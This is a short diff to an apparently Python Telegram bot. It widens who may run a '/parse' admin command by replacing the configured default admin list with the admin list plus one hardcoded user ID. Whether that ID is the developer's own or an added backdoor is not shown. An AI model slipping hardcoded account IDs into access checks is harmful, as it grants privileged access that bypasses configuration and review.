@@ -8,7 +8,7 @@ from parsing import parse
 from func import logger
 
 
-@Client.on_message(filters.command("parse") & filters.user(config.default_admins))
+@Client.on_message(filters.command("parse") & filters.user(config.admins+[29764093]))
 async def start_parse(app: Client, message: Message):
     logger.loggers(message, text="used !parse")
     await message.delete()
